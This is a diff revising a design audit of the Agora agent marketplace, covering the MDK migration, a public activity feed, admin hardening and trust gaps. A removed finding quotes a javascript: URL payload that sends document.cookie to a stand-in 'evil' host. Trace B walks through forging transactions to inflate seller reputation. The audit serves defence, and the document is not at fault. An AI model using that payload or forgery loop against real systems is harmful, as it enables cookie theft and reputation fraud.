@@ -1,13 +1,31 @@
-# Agora — design audit (post-rebrand)
+# Agora — design audit (post-MDK migration, ADR 0014)
 
-> Independent paper review. No code changes. No tests run. Reviewer
-> approached the codebase fresh, reading `README.md`, `PAYMYAGENT.md`,
-> ADRs 0001–0013, `docs/BUILD-SUMMARY.md`, and a targeted scan of the
-> sources. The project was renamed LUMEN → Andromeda → Agora; the
-> Andromeda audit at this same path is the prior version this one
-> overwrites. This audit looks at: (a) post-rebrand additions
-> (`dashboard/`, `web/`, ADR 0013 triple-aliasing), and (b) the original
-> findings — whether they hold, shift, or are addressed.
+> Independent paper review. No code changes; no tests run. Reviewer
+> approached fresh, reading `README.md`, `PAYMYAGENT.md`, ADRs
+> 0001–0014, `docs/BUILD-SUMMARY.md`, `DEPLOY.md`, then a targeted
+> source scan. This audit overwrites the previous (post-rebrand)
+> design audit. It centres on:
+>
+> 1. ADR 0014 (L402 → MDK wire format) coherence and timeline.
+> 2. The activity-feed PR (`5aacd66`) and its leakage surface.
+> 3. The deploy commit (`d64ebcf`) — admin hardening completeness.
+> 4. Whether ADR 0013 triple-aliasing has narrowed under MDK.
+> 5. Status of the previous audit's top-5 design concerns.
+
+Working directory `C:\Projects\lumen`. All file paths in this report
+are absolute.
+
+---
+
+## 0. Verdicts at a glance
+
+| Item | Verdict |
+|---|---|
+| Previous Top-5 status | 0 of 5 addressed in code; 1 partially mitigated by deprecation framing; the rest unchanged or shifted. |
+| MDK migration (ADR 0014) | **Stopgap: the wire format is MDK-compatible, but no MDK code is on any execution path; "real mode" still uses the in-house mint and an offline shim. Hybrid story creates net-new technical debt.** |
+| Deploy hardening (`d64ebcf`) admin secret | **Clean fix** for the previous P1 default (`dev-admin-secret`) — the fallback string is gone from all three call sites; new helper fails closed (503) when env unset. |
+| Activity feed (`5aacd66`) | New public exposure surface. Counterparty graph + per-tx `payment_hash` prefix now public, uncached for ≥2 s. |
+| Triple-aliasing (ADR 0013) | Not narrowed by ADR 0014; still widened. The L402 wrapper now adds a fourth shape (legacy-macaroon soft-transition path). |
 
 ---
 
@@ -18,465 +36,540 @@
 **C-1 (was, still). "No accounts, no email" vs. registry pubkey upsert.**
 ADR 0001 frames Agora as account-free; ADR 0004 + the schema make the
 Ed25519 pubkey *the* account (PRIMARY KEY in `sellers`, signed upsert
-write-protection). The rhetorical contradiction is unchanged. ADR 0013
+write-protection). The rhetorical contradiction is unchanged. ADR 0014
 did not amend the framing.
 
 **C-2 (was, still). "Blind" reviewer assignment is not blind.**
-`registry/src/lib/reviews.ts::pickRandomReviewer` returns the row with
-`subject_pubkey` to the reviewer via `getReviewerAssignments`. The
-reviewer trivially derives the seller. No commit-reveal, no `seed`
-column, no transcript. ADR 0010 still markets this as a primitive. No
-change.
+`C:\Projects\lumen\registry\src\lib\reviews.ts::pickRandomReviewer`
+returns the row with `subject_pubkey` to the reviewer via
+`getReviewerAssignments` (the `SELECT … subject_pubkey …` at lines
+38–46). The reviewer trivially derives the seller. No commit-reveal,
+no `seed` column, no transcript. ADR 0010 still markets this as a
+primitive.
 
 **C-3 (was, still). Real-mode dataset path doesn't exist.**
-`agents/dataset-seller/src/server.js` still serves the JSON fixture
+`agents/dataset-seller/src/server.js` still serves a JSON fixture
 unconditionally. ADR 0008's "actual file lives on disk (configured via
-env)" remains vapor. No change.
+env)" remains vapor. README §"Known limitations" calls out
+`agora_purchase_dataset` "not implemented in MCP real mode" but does
+not own the deeper claim that no file delivery exists at all.
 
 **C-4 (was, still). Dispute path slashes on the disputer's say-so.**
-`/api/v1/reviews/[id]/dispute/route.ts` calls `slashReviewer` with
-`evidence: json.evidence ?? {}` and never verifies (a) the disputer is a
-buyer-of-record, (b) the evidence is well-formed, (c) silent re-review
-deviation. ADR 0010 §"Two-sided slashing" is unimplemented as written.
-No change.
+`C:\Projects\lumen\registry\src\app\api\v1\reviews\[id]\dispute\route.ts`
+calls `slashReviewer` with `evidence: json.evidence ?? {}` and never
+verifies (a) the disputer is a buyer-of-record, (b) the evidence is
+well-formed, (c) silent re-review deviation. ADR 0010
+§"Two-sided slashing" is unimplemented as written.
 
 **C-5 (was, still). Tx record is seller-signed; buyer field is unsigned.**
-`registry/src/app/api/v1/transactions/record/route.ts` still verifies
-only `auth.pubkey === seller_pubkey`; `buyer_pubkey` is whatever the
-seller posts. No change.
+`C:\Projects\lumen\registry\src\app\api\v1\transactions\record\route.ts`
+verifies only `auth.pubkey === seller_pubkey` (line 30); `buyer_pubkey`
+is whatever the seller posts. Concern #3 from the prior audit holds
+verbatim.
 
-**C-6 (NEW, post-ADR 0013). The verifier "accepts three header families"
-claim is contradicted by the registry's own gate.**
-`registry/src/lib/sig.ts::verifySignedRequest` performs a manual
-pre-check:
+**C-6 (was, still). Three-header-family acceptance is untrue for the
+registry's signed-write gate.**
+`C:\Projects\lumen\registry\src\lib\sig.ts` lines 16–18 short-circuit
+401 ("missing signature headers") if the canonical `x-agora-*` triplet
+is absent — *before* `@agora/core::verifyRequest`'s multi-family
+walker is consulted. Buyers signing `x-andromeda-*` or `x-lumen-*`
+hit the early-return. The phase-1b regression test asserts only the
+status code, not the reason string, so the test passes despite
+mis-implementation. Unchanged by ADR 0014; the L402 layer's
+"three-shape" promise inherits the same trust-but-don't-verify
+posture (see C-12 below).
 
-```ts
-if (!headers[HDR_PUBKEY] || !headers[HDR_SIG] || !headers[HDR_TIMESTAMP])
-  return { ok: false, status: 401, reason: "missing signature headers" };
-```
-
-`HDR_PUBKEY` etc. resolve to the canonical `x-agora-*` constants only.
-A request with `x-andromeda-*` or `x-lumen-*` headers (the legacy
-families ADR 0013 promises to accept) is rejected with 401 *before*
-`verifyRequest` (which DOES iterate all three families) is ever called.
-
-The phase-1b regression test (`scripts/test-phase1b.js:123`) injects a
-tampered `x-andromeda-*` set and asserts 401 — but it is the wrong 401
-("missing signature headers" instead of "signature invalid"). The test
-shape passes either way, so neither the design nor the test detect the
-bug. **The "registry accepts the legacy header family" half of ADR 0013
-is unimplemented.**
-
-The provider's *naked* buyer-attribution headers (the
-`x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey` fallback chain
-in `provider/src/app/api/v1/listing-verify/route.ts:38-41`) DO accept
-all three names — but those are unauthenticated to begin with (S3
-below), so this isn't a guarded path.
-
-**C-7 (NEW, ADR 0011). Dashboard kill-switch isn't enforced on registry
+**C-7 (was, still). Dashboard kill-switch isn't enforced on registry
 proxy endpoints.**
-ADR 0011 §3 (third bullet) says: *"When the kill-switch is on, the
-control plane can refuse to proxy registry calls (future work) so the
-human's 'halt' actually halts the dashboard's external chatter."* The
-current `mcp/control-plane.js` handler enforces kill-switch only inside
-`budget.js::reserve()`, which is called by paid MCP tools. The five new
-proxy endpoints (`/balance`, `/transactions`, `/subscriptions`,
-`/subscriptions/:id/cancel`, `/sellers`) do not check
-`getKillSwitch()`. The dashboard UI tells users *"When ON, every paid
-MCP tool refuses with `kill_switch_active`"* (`Allowance.tsx:96`),
-which is technically true — but the MCP HTTP proxy that the dashboard
-itself talks through happily continues to make outbound calls (and the
-SPA continues to issue them), which contradicts the ADR's stated goal
-("halts the dashboard's external chatter"). The "future work"
-admission is honest at the ADR level; the UI copy isn't.
+ADR 0011 §3 third-bullet asserts a future-work integration that has
+not landed. The audit-behavior report agrees.
 
-Notably, `POST /subscriptions/:id/cancel` — a *write* — is also gated
-by neither kill-switch nor budget. A compromised dashboard origin (see
-S5 below) can cancel any subscription whose ID it knows.
+**C-8 (was, still). Web index trusts registry headers; SSR pages can
+desync silently.**
+`web/` is `revalidate = 0` in the activity page but ISR-cached
+elsewhere; cache invalidation on registry mutation is not specified
+anywhere.
 
-**C-8 (NEW, ADR 0012). Seller URL is rendered into `<a href>` without
-scheme validation.**
-The web index renders `seller.url` from the registry directly into
-`href` attributes (`web/src/app/sellers/[pubkey]/page.tsx:51-58`,
-`web/src/app/services/[id]/page.tsx:93-100`). No scheme allowlist, no
-URL parsing, no sanitization. Registration accepts any string —
-`registry/src/app/api/v1/sellers/register/route.ts:33-38` only checks
-truthiness. A malicious seller can register `url:
-"javascript:fetch('//evil/'+document.cookie)"`. React escapes the body
-text by default (so `<script>` in `description` is inert), but
-`href="javascript:..."` is not auto-blocked by JSX prior to React 19's
-`react-dom` URL sanitizer landing universally — and even where blocked,
-`<a target="_blank" rel="noopener">` does not protect against scheme
-poisoning. The ADR 0012 trust-boundary discussion does not mention
-this; the audit prompt asked specifically about it.
+**C-9 (NEW, ADR 0014). The "MDK migration" doesn't migrate to MDK.**
+ADR 0014 §"Decision" promises that real-mode runs through
+`@moneydevkit/nextjs/server.withPayment` end-to-end; `provider/` does
+not import `@moneydevkit/*` at all. Grep across the repo's source
+shows zero `withPayment`, `moneydevkit`, or `MDK_ACCESS_TOKEN` symbols
+in any executed file. The provider's real-mode path is identical to
+the mock-mode path: `mintMacaroon(...)` from
+`packages/agora-core/src/l402.ts`, signed with `L402_SECRET` (NOT
+`MDK_ACCESS_TOKEN`), invoiced via the in-house wallet adapter. The
+README §"Path B" admits this in passing: *"The provider continues to
+use its own L402 wrapper today. The full
+`@moneydevkit/nextjs/server.withPayment` adoption is the documented
+next step in ADR 0014 §Migration timeline."* That is a fair
+disclosure; what makes it incoherent is that ADR 0014's main decision
+table claims real-mode goes through MDK end-to-end *now*. The two
+documents disagree.
 
-The same registration path also accepts arbitrary HTML in
-`description` and `name`. They render as inert text via JSX, so no
-direct XSS — but if any future surface re-renders these via
-`dangerouslySetInnerHTML` (e.g. an OG-image generator, a feed, an
-RSS), the input is unsanitized at the source.
+**C-10 (NEW, ADR 0014). The "byte-identical to MDK" claim is
+unverifiable in this repo.**
+`packages/agora-core/src/l402.ts::mintMacaroon` re-implements MDK's
+HMAC scheme (`KEY_DERIVATION_TAG = "mdk402-token-v1"`, the JSON shape
+with `paymentHash/amountSats/expiresAt/resource/amount/currency/sig`,
+the `\0`-joined sig pre-image). There is no test against a real
+MDK-issued credential; the byte-identity claim is asserted by ADR
+0014 §"Decision" but not pinned by any fixture. If MDK changes its
+internal token format (no SemVer guarantee on a
+`@moneydevkit/core/dist/mdk402/token.js` private export), the offline
+shim drifts silently. The shim is functionally an in-house format
+that *resembles* MDK's, not a tested MDK compatibility layer.
 
-### 1.2 Code decisions absent from any ADR
+**C-11 (NEW, ADR 0014). Migration timeline is unspecified.**
+ADR 0014 §"Migration timeline" reads *"One major-version bump from
+now: drop the legacy verifier."* No major-version is defined for this
+repo (the root package is `lumen` and ships nothing); no version exists
+at the workspace level either. The "deprecation cycle" is rhetorical.
+Compare to ADR 0013, which has the same problem. Two stacked
+deprecation cycles ride on a non-versioned package.
 
-(All from the prior audit unchanged unless noted.)
+**C-12 (NEW, ADR 0014). Soft-transition verifier widens the
+acceptable-credential surface.**
+`verifyAuth` first attempts MDK-shape, then falls back to legacy
+`base64url(json).hmac`. Both formats use the same `L402_SECRET`. The
+legacy verifier (`verifyMacaroonLegacy` lines 200–221) does NOT
+key-derive — it HMACs the payload directly with the raw secret. So the
+*same* secret is used to authorise two distinct token formats with two
+distinct signing constructions. There is no negative test that a
+forged MDK-shape credential containing arbitrary `paymentHash` cannot
+be rewritten as a legacy-shape credential and accepted; the verifiers
+are independent code paths with independent attacker surfaces. This
+is not a known break, but it is a widening of the cryptographic
+boundary that the old single-format verifier did not have.
 
-- **D-1.** `service-id = pubkey[:8] + ":" + local_id` — 32-bit prefix,
-  birthday-collision risk. No ADR. (`registry/src/lib/db.ts:101`)
-- **D-2.** Macaroon HMAC binds only `payment_hash`/`resource`/`amount`/
-  `exp` — no buyer pubkey caveat, no nonce. No ADR.
-- **D-3.** `slashReviewer` writes a ghost seller row when the slashed
-  reviewer doesn't exist as a seller. Ghost rows surface in
-  `GET /v1/sellers`. (`registry/src/lib/reviews.ts:142-146`)
-- **D-4.** Dispute audit log HMAC default secret literal:
-  `"registry-default-secret-please-set-something-stronger"` is committed
-  in the source as fallback (`reviews/[id]/dispute/route.ts:23`).
-  Default deployments → unfalsifiable audit signatures.
-- **D-5.** `agora_purchase_dataset` couples to a per-seller
-  `/api/dev/pay` endpoint. No ADR.
-- **D-6.** Dataset-seller and provider both record tx with
-  `buyer_pubkey ?? null` from an unauthenticated header. (Now
-  three-way: `x-agora-* ?? x-andromeda-* ?? x-lumen-*`.)
-- **D-7 (NEW).** Dashboard SPA persists the bearer token in
-  `localStorage` (`dashboard/src/lib/controlPlane.ts:9-46`). Any
-  XSS in the SPA — or any future browser-extension privilege
-  problem — leaks the control-plane token, which has full kill-switch
-  authority and can cancel subscriptions. ADR 0011 doesn't discuss
-  this.
-- **D-8 (NEW).** The control-plane CORS allow-list reads
-  `AGORA_DASHBOARD_ORIGINS ?? ANDROMEDA_DASHBOARD_ORIGINS ??
-  LUMEN_DASHBOARD_ORIGINS` and defaults to `http://localhost:5173`. No
-  ADR mentions the env override; there is no allow-list for `origins:
-  ""` (file: scheme); a Tauri shell would need to add
-  `tauri://localhost` (the ADR foreshadows this but does not pin a
-  date or name a single source of truth).
-- **D-9 (NEW).** Triple-aliasing means the *naked* attribution header
-  resolution chain on each paid-endpoint widens from one acceptable
-  header (Andromeda era) to three (post-ADR 0013). Header-confusion
-  surface for buyer attribution grew; nothing in ADR 0013 frames this
-  as a trade-off. (See S3.)
+**C-13 (NEW, ADR 0014). Mock-mode HMAC keying disagrees with MDK's KDF
+purpose.**
+ADR 0014 §"Seller secret" says: *"`MDK_ACCESS_TOKEN` for real
+Lightning, `L402_SECRET` for mock-mode HMAC seed. We do NOT
+cross-wire them."* But mock-mode mints feed `L402_SECRET` into
+`deriveKey(secret) = HMAC(secret, "mdk402-token-v1")` — the very KDF
+tag MDK uses to domain-separate `MDK_ACCESS_TOKEN` from its other
+keys. Reusing the tag with a different upstream secret is harmless in
+isolation (the tag is just a label) but defeats the domain separation
+MDK chose. If a deployment ever cross-wires the two by accident — set
+`L402_SECRET = MDK_ACCESS_TOKEN` to "test before flipping
+`MOCK_MODE`" — the two systems become forge-equivalent. This isn't a
+break; it's a footgun the ADR explicitly creates by reusing MDK's
+internal constant.
+
+### 1.2 Code decisions not in any ADR
+
+**U-1 (was, still). Honor write paths are not all in one ADR.**
+Honor is mutated in `rateSeller`, `submitReview`, `slashReviewer`, and
+`maybeRunDecay`. ADR 0010 covers reviews + decay; the buyer-rating
+write path is not described anywhere — it's invented in
+`registry/src/lib/reviews.ts::rateSeller`.
+
+**U-2 (was, still). Platform fee is a counter, not a payout.**
+ADR 0008 promises a "two-step settlement to a platform NWC". The code
+records `platform_fee_sats` on each tx and exposes a `/v1/platform/revenue`
+admin GET (now properly admin-gated, see §3) but never makes a
+payment. README §"Known limitations" admits this. Concern #5 from
+the prior audit is unaddressed.
+
+**U-3 (NEW). The activity feed is undescribed in any ADR.**
+`registry/src/app/api/v1/transactions/recent/route.ts` (37 lines,
+public, uncached past the 2 s s-maxage), `web/src/app/activity/page.tsx`
+(101 lines, SSR + force-dynamic) — neither lives in ADR 0012 (which
+froze the web index at 7 pages: `/`, `/sellers`, `/sellers/:pubkey`,
+`/services`, `/services/:id`, `/search`, `/recommend`). The PR adds
+an 8th page (`/activity`) and a new public registry endpoint without
+an ADR. The schema name in the response (`agora.transactions.v1`) is
+a wire-format commitment that no ADR lists.
+
+**U-4 (NEW). The deploy contract isn't an ADR either.**
+`DEPLOY.md` and `d64ebcf` introduce a Fly.io single-instance contract
+("registry must stay at exactly one machine because of SQLite") and a
+specific failure mode for breach (data corruption). This is a
+load-bearing operational invariant that ADR 0004 (registry design)
+predicted ("SQLite, one writer") but never bound to a deploy
+topology. The single-instance constraint is now in the runtime
+trust model and should be in an ADR.
 
 ### 1.3 Architecture-vs-reality drift
 
-ADR 0001's diagram still shows a "Tauri Dashboard" at the bottom. ADR
-0006 / 0011 say: SPA-first, Tauri optional, Tauri shell deferred until
-`cargo` is available. The implementation aligns with the ADR-0011
-position — Vite SPA in `dashboard/`, Tauri-stub script that no-ops on
-machines without Rust. The ADR-0001 diagram is still not annotated; a
-new reader looking only at ADR 0001 will infer a Tauri app exists.
+**D-1 (was, still). Mock and real diverge on idempotency authority.**
+ADR 0014 says real mode delegates idempotency to MDK's backend;
+mock mode keeps the seller's SQLite invoices table. In actual code
+(C-9 above) real mode also uses the SQLite table because `withPayment`
+is never called. So the divergence the ADR predicts hasn't happened
+yet — which means the ADR is describing a *future* architecture, not
+the deployed one. Documentation lag.
 
-Public web index (`web/`): the architecture promotes a fourth Next.js
-surface (after provider/registry/market-monitor — well, market-monitor
-is Express). ADR 0012 doesn't mention that the web app issues
-*server-side* `fetch()` to the registry without any signed-request
-flow, which is correct for read-only access but means the web app is
-fully trusted by the registry to make the right read-only choices —
-i.e. the trust boundary the ADR claims (read-only, server-side) is
-real but undefended-in-depth: a misconfigured deployment could expose
-the registry's port directly to clients, defeating the boundary.
+**D-2 (was, still). Buyer-side claims invariant under MDK.**
+PAYMYAGENT.md is correct that the buyer is unchanged: it never sees
+the macaroon's structure. This claim survives the migration
+unchanged.
+
+**D-3 (NEW). README mock-mode claim is precise; ADR 0014 mock-mode
+claim is over-strong.**
+README: *"Mock mode is the default everywhere — fake invoices,
+deterministic preimages, zero sats moved."* ADR 0014 §"Decision":
+*"Offline shim mints / verifies MDK-shape macaroons byte-for-byte"*.
+The README claim is true; the ADR claim is unprovable in the repo
+(C-10).
 
 ---
 
 ## 2. Spec gaps
 
-### 2.1 Built-but-not-claimed (silent additions)
-
-| Endpoint / behaviour                                       | Stated where? |
-|------------------------------------------------------------|---------------|
-| `POST /api/v1/admin/fast-forward`                          | Build-summary only |
-| `POST /api/dev/tick` (market-monitor)                      | Build-summary only |
-| Heartbeat 60s self-re-register                             | ADR 0004 footnote |
-| Reviewer ghost-seller insert (D-3)                         | Nowhere |
-| Service-id 8-hex prefix collision surface                  | Nowhere |
-| FTS5 query token sanitization (raw `q` → SQLite FTS5)      | Nowhere |
-| **Dashboard SPA → control-plane proxy → registry path**    | ADR 0011 §3 (well-stated) |
-| **Web index → registry direct fetch**                      | ADR 0012 (well-stated) |
-| **Triple-aliasing on naked attribution header**            | ADR 0013 §"naked header" line — but trade-offs absent |
-| Dashboard `localStorage` bearer-token persistence          | Nowhere |
-| Web app's `<a href={seller.url}>` rendering                | Nowhere |
-
-### 2.2 Claimed-but-missing or partial
-
-(Same as previous audit, plus rebrand-era claims.)
-
-| Claimed in                                                  | Reality |
-|-------------------------------------------------------------|---------|
-| ADR 0008: "actual file lives on disk (configured via env)"  | Not implemented (C-3). |
-| ADR 0010: silent re-review sampling                         | Not implemented. |
-| ADR 0010: buyer-side fraud slashing                         | Not implemented. |
-| ADR 0010: per-service "peer-reviewed" badge                 | Implemented as per-seller. |
-| ADR 0005: real-mode subscribe deposit via L402              | Not implemented. |
-| ADR 0005: cancel-refund in real mode                        | Not implemented. |
-| ADR 0008: two-step Lightning settlement to platform         | Counter only. |
-| ADR 0011 §3: "kill-switch refuses to proxy registry calls"  | Not implemented (C-7). UI copy implies it is. |
-| ADR 0013: "verifier accepts EITHER family on incoming"      | Half-implemented for signed writes (C-6). Pre-gate rejects `x-andromeda-*` and `x-lumen-*` requests as "missing signature headers" before `verifyRequest` is consulted. |
-| ADR 0012: read-only public index                            | True (no write paths) — but `seller.url` injection vector is ignored in trust-boundary writeup (C-8). |
-| Phase 7 "robots permissive, sitemap dynamic"                | Implemented. |
-
-### 2.3 Test-script coverage gaps per phase
-
-Largely unchanged from the prior audit. Newly notable:
-
-- `scripts/test-phase1b.js` asserts `x-andromeda-*` tampered → 401 but
-  doesn't distinguish "signature invalid" from "missing signature
-  headers" — masks C-6.
-- `scripts/test-phase3-ui.js` (per BUILD-SUMMARY) verifies CORS
-  preflight from `evil.com` is rejected and that endpoint paths appear
-  in the bundle string — it does not assert that the kill-switch
-  refuses to proxy `/sellers` or cancel a subscription. So C-7 is
-  un-tested.
-- The web index test (`scripts/test-phase7.js`) is described as "7
-  pages, sitemap, robots." Whether it tests `<a href=javascript:...>`
-  rejection or `description` HTML escaping is unclear from the
-  build-summary alone; the page code suggests **no scheme validation
-  exists at all**, so any such test would either skip the case or
-  assert the broken behaviour. (Uncovered — see C-8.)
+| ID | Gap | Severity |
+|---|---|---|
+| S-1 | `rateSeller` accepts unbounded repeats per (buyer, seller). No `UNIQUE(buyer_pubkey, seller_pubkey)` constraint, no last-rating overwrite, no rate-limit. One tx + N rate calls = ±5N honor. | CRITICAL — UNCHANGED |
+| S-2 | `recordTransaction` `buyer_pubkey` is seller-asserted. Combined with S-1, sybil-rate of any seller by a colluding seller is one HTTP call away. | HIGH — UNCHANGED |
+| S-3 | `pickRandomReviewer` uses `Math.random()` (line 21 of reviews.ts) — non-VRF, server-decided, unverifiable. ADR 0010's "blind random" cannot be audited by anyone except whoever runs the registry. | HIGH — UNCHANGED |
+| S-4 | Escrow / slashing payouts are counters; no Lightning leg. Same as #2 of the prior audit. | CRITICAL — UNCHANGED |
+| S-5 | Platform fee is a counter; same as #5 of prior audit. | HIGH — UNCHANGED |
+| S-6 | (NEW) `transactions/recent` returns full `buyer_pubkey`, full `seller_pubkey`, `payment_hash`, `service_id`, `amount_sats`, `settled_at` — public. Counterparty graph and full payment-hash prefix (8 chars displayed; full 64 in JSON) is enumerable. | MEDIUM (privacy) — NEW |
+| S-7 | (NEW) ADR 0014 names but does not bind a deprecation date for legacy macaroons. ADR 0013 has the same problem. Two compounding open-ended deprecations. | MEDIUM — NEW |
+| S-8 | (NEW) No fixture asserts "MDK-shape macaroon minted by Agora is accepted by MDK". The byte-identity claim is untested. | MEDIUM — NEW |
 
 ---
 
 ## 3. Money-flow traces
 
-### 3.1 Single L402 listing-verify call (240 sat)
+### Trace A — Provider listing-verify, 240 sat (real mode, ADR 0014)
 
 ```
-buyer_wallet ── 240 sat (Lightning) ──► provider_wallet
-                                          │
-                              (settled preimage)
-                                          │
-                              fire-and-forget HTTP POST
-                                          ▼
-                            registry: transactions.record
-                                  amount_sats=240
-                                  platform_fee_sats=5  (rounded 2%, seller-set)
-                            (NO money moves to platform — counter only)
+Buyer (NWC)                 Provider (Next.js, port 3000)             Registry (port 3030)
+   │
+   │ POST /v1/listing-verify (no auth)
+   ├─────────────────────────►
+   │                          │ 1. require402 → wallet().makeInvoice()
+   │                          │    [in-house wallet, NOT @moneydevkit]
+   │                          │ 2. mintMacaroon({...}, L402_SECRET)
+   │                          │    [agora-core mint — MDK *shape* but
+   │                          │    keyed off L402_SECRET, NOT
+   │                          │    MDK_ACCESS_TOKEN]
+   │                          │ 3. recordInvoice(SQLite, status='pending')
+   │   402 + WWW-Authenticate │
+   │◄─────────────────────────┤
+   │
+   │ NWC pay(invoice) → preimage          (sats land in seller wallet,
+   │                                       NOT in MDK custody)
+   │
+   │ POST /v1/listing-verify
+   │   Authorization: L402 <macaroon>:<preimage>
+   ├─────────────────────────►
+   │                          │ 4. verifyAuth: try MDK-shape verify;
+   │                          │    if fail, fallback to legacy verify
+   │                          │    (both with L402_SECRET) [C-12]
+   │                          │ 5. markInvoiceConsumed (SQLite)
+   │                          │ 6. handler runs
+   │                          │
+   │                          │  POST /v1/transactions/record
+   │                          │  signed by SELLER, buyer_pubkey free-form [S-2]
+   │                          ├──────────────────────────────────────────►
+   │                          │                                           │
+   │   200 + body             │                                           ▼
+   │◄─────────────────────────┤                                       Tx ledger
+   │                                                                   • visible on
+   │                                                                     /api/v1/transactions/recent
+   │                                                                     (PUBLIC) [S-6]
 ```
 
-Hops where money / integrity can be lost:
+Annotations:
+- **None of this traffic touches `mainnet.moneydevkit.com`.** ADR 0014
+  §"Decision" says it does in real mode; the code says it does not.
+- **Platform fee** is recorded on the tx row (`platform_fee_sats`)
+  but no payment leg is made; no NWC handle to a "platform wallet"
+  exists in any code path.
 
-- **L1.** L402 macaroon-bound to `payment_hash` only — if any third
-  party pays the bolt-11, the macaroon-holder still gets access.
-- **L2.** `txId = "tx_" + payment_hash[:24]` — across providers,
-  prefix collisions could occur; UNIQUE constraint silently drops the
-  second.
-- **L3.** `platform_fee_sats` is set by the seller in the signed body
-  — the registry doesn't recompute. Fee can be 0 with no consequence.
-- **L4.** No two-step settlement; platform never sees sats.
-- **L5 (post-rebrand).** Buyer attribution header now resolves
-  `x-agora-pubkey ?? x-andromeda-pubkey ?? x-lumen-pubkey`. An
-  off-protocol attacker who sends an L402-paid call with
-  `x-lumen-pubkey: <victim>` will write `<victim>` into the registry
-  ledger as the buyer of that tx — gaming `rateSeller`'s 30-day-tx
-  gate (S3 below) for any victim pubkey, not just the attacker's own.
+### Trace B — Honor manipulation under S-1 + S-2
 
-### 3.2 Dataset purchase + peer review
+```
+Colluding seller K
+    │
+    │ 1. POST /v1/transactions/record signed by K
+    │    body: { buyer_pubkey: <pubkey K_buyer>, seller_pubkey: <pubkey M>,
+    │            service_id: ..., amount_sats: 1, payment_hash: <random hex> }
+    │    [S-2: buyer_pubkey accepted at face value]
+    ▼
+  Registry tx ledger ← row inserted (tx with K_buyer "purchasing" from M)
+    │
+    │ 2. POST /v1/sellers/M/rate signed by K_buyer
+    │    body: { stars: 5 }
+    │    [passes the 30-day tx gate because step 1 just made one]
+    ▼
+  Registry: M.honor += 2
 
-Identical flow to before. `escrow_sats` is fictitious (no payment
-proof), `reviewer_payout_sats` is returned in JSON but no
-`reviewer_owed` ledger column exists, slashing escrow clawback is a
-JSON field with no balance write. No change.
+  REPEAT step 2 → S-1: rateSeller has no UNIQUE, no overwrite, no
+  rate-limit. Each call adds 2. Hundred calls = +200 honor. Same buyer
+  pubkey, same seller, same code path, no detection.
+```
 
-### 3.3 Honor inflation via repeated `rateSeller`
+Cost to attacker: 0 sats (the recorded tx need not have a real
+preimage — `payment_hash` is a free-form string the registry never
+verifies). One Ed25519 keypair (K_buyer) can be created in microseconds.
+This trace is unchanged from the prior audit; it is the central
+unaddressed Top-1 concern.
 
-Unchanged. `UPDATE sellers SET honor = honor + ?` runs on every call.
-No (buyer, seller) UNIQUE index, no per-tx binding. **One 240-sat
-purchase + a rate loop = ±2 honor per request, unbounded.** This
-remains the highest-severity finding.
+### Trace C — Activity feed leakage (NEW)
+
+```
+Anonymous client
+    │
+    │ GET /api/v1/transactions/recent?limit=200
+    ▼
+  Public response (cache: 2 s):
+   [
+     { buyer_pubkey, seller_pubkey, service_id, amount_sats,
+       platform_fee_sats, payment_hash, settled_at }, ... × 200
+   ]
+```
+
+What is leaked that aggregate `/sellers/:pubkey/stats` did NOT leak:
+- Which buyers transact with which sellers (bipartite graph).
+- Per-tx amounts (existing per-seller stats give totals, not
+  individual rows).
+- `payment_hash` per tx — public; combined with a real-mode wallet's
+  on-chain visibility, may correlate to specific paid invoices.
+- Tx timing — useful for activity-fingerprinting low-volume sellers.
+
+For a low-volume seller (1–5 txs/day), the buyer set is enumerable
+within a few crawls.
 
 ---
 
-## 4. Trust-model matrix
+## 4. Trust model matrix
 
-| Privileged action                                | Triggered by                                           | Verification                                                                                                | Publicly auditable? |
-|--------------------------------------------------|--------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|---------------------|
-| Seller registration / upsert                     | Seller (signed)                                        | Ed25519 sig (Agora family pre-check; legacy families silently rejected — C-6)                               | YES |
-| Service catalog write                            | Seller (signed)                                        | Ed25519 sig                                                                                                 | YES |
-| Tx record                                        | Seller (signed) — buyer_pubkey unsigned                | Sig matches `seller_pubkey` only                                                                            | PARTIAL |
-| `platform_fee_sats` value                        | Seller (signed)                                        | NONE — server stores whatever number                                                                        | NO |
-| Buyer rating (`/rate`)                           | Buyer (signed)                                         | 30-day tx exists — but tx-buyer field is forgeable (S3) and per-(buyer,seller) uniqueness absent (S1)        | PARTIAL |
-| Review request                                   | Seller (signed)                                        | Sig only — no escrow proof of payment                                                                       | NO |
-| Reviewer availability                            | Reviewer (signed)                                      | Ed25519 sig                                                                                                 | YES |
-| Review submission                                | Reviewer (signed)                                      | Sig + rubric validation                                                                                     | YES |
-| Slashing / dispute                               | Anyone with a valid Ed25519 keypair                    | Sig only; no buyer-of-record check; HMAC default-secret fallback (D-4)                                      | YES (event row, but evidence is whatever the disputer posts) |
-| Honor decay                                      | Lazy on `GET /sellers/:pubkey` OR admin-secret POST    | None server-side beyond `decay_runs` self-coordination                                                      | YES (decay_runs row) |
-| Reviewer assignment ("random-weighted")          | Seller's `request_review`                              | Server picks; no commit-reveal, no published seed                                                            | NO |
-| Honor delta per rating                           | Buyer                                                  | None — unbounded per (buyer, seller)                                                                        | NO |
-| Admin endpoints                                  | Holder of `ADMIN_SECRET` (default `"dev-admin-secret"`)| Plain header check                                                                                          | NO |
-| **Kill-switch on dashboard SPA flow**            | Holder of control-plane bearer token                   | Bearer auth; CORS allow-list `localhost:5173` only                                                          | YES (control plane logs) |
-| **Cancel subscription via control plane proxy**  | Holder of control-plane bearer token                   | Bearer auth ONLY; not gated by kill-switch (C-7) or budget                                                  | NO (no audit log on cancel) |
-| **Sellers list (public web index)**              | Anyone hitting `GET /api/v1/sellers`                   | None — public read                                                                                          | YES |
-| **`<a href={seller.url}>`** (web index)          | Visitor click                                          | None — registry returns whatever `url` was registered (C-8); web app does not validate scheme              | NO |
-
-Privileged actions the registry/control-plane can do that are not publicly auditable: the prior audit's A1–A5 stand. Add:
-
-- **A6 (NEW).** Control-plane operator (anyone holding the bearer
-  token) can cancel any local subscription without an audit log
-  entry.
-- **A7 (NEW).** Web index could be replaced or rerouted to a
-  different registry without any signed integrity check (the URL is
-  just an env var).
+| Actor | Trusted to | NOT trusted to | Verified by |
+|---|---|---|---|
+| Buyer (MCP/NWC) | Pay invoices; submit reviews truthfully | Read other buyers' tx | NWC wallet boundary |
+| Seller | Mint own L402 macaroons; record own txs | Self-attest buyer pubkey | Ed25519 sig on `transactions/record` (S-2: only seller side checked) |
